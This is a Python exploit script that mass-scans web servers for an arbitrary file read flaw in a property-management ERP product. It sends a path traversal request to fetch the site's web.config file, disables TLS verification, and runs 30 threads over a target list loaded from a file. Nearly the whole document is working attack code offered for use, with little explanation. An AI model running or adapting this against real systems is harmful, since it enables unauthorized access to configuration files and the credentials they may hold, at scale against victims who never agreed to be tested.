import requests
import argparse
from multiprocessing.dummy import Pool
from urllib.parse import urlparse
requests.packages.urllib3.disable_warnings()

def poc(url):
    target = f"{url}/HM/M_Main/InformationManage/AreaAvatarDownLoad.aspx?AreaAvatar=../web.config"

    header = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
              'Connection': 'close'}
    try:
        r = requests.get(target, headers=header, verify=False)
        if r.status_code == 200 and "web.config" in r.text:
            print(f"{url}[*]存在漏洞")
        else:
            print(f"{url}[-]不存在漏洞")

    except Exception as e:
        print(f"{url}[-]超时")
if __name__ == '__main__':
    banner = """
     .----------------.  .----------------.  .----------------.  .----------------. 
    | .--------------. || .--------------. || .--------------. || .--------------. |
    | | ____    ____ | || |      __      | || |     _____    | || |  ___  ____   | |
    | ||_   \  /   _|| || |     /  \     | || |    |_   _|   | || | |_  ||_  _|  | |
    | |  |   \/   |  | || |    / /\ \    | || |      | |     | || |   | |_/ /    | |
    | |  | |\  /| |  | || |   / ____ \   | || |   _  | |     | || |   |  __'.    | |
    | | _| |_\/_| |_ | || | _/ /    \ \_ | || |  | |_' |     | || |  _| |  \ \_  | |
    | ||_____||_____|| || ||____|  |____|| || |  `.___.'     | || | |____||____| | |
    | |              | || |              | || |              | || |              | |
    | '--------------' || '--------------' || '--------------' || '--------------' |
    '----------------'  '----------------'  '----------------'  '----------------' 



    """
    print(banner)
    parse = argparse.ArgumentParser(description="天问智慧物业ERP多处接口存在任意文件读取漏洞")
    # 添加命令行参数
    parse.add_argument('-u', '--url', dest='url', type=str, help='Please input url')
    parse.add_argument('-f', '--file', dest='file', type=str, help='Please input file')
    args = parse.parse_args()
    pool = Pool(30)
if args.url:
    if "http" in args.url:
        poc(args.url)
    else:
        t2 = f"http://{args.url}"
        poc(t2)
        t3 = f"https://{args.url}"
        poc(t3)
elif args.file:
    f1 = open(args.file, 'r')
    targets = []
    for l in f1.readlines():
        l = l.strip()
        if "http" in l:
            target = f"{l}"
            targets.append(target)
        else:
            target = f"http://{l}"
            targets.append(target)
            target1 = f"https://{l}"
            targets.append(target1)
    pool.map(poc, targets)
    pool.close()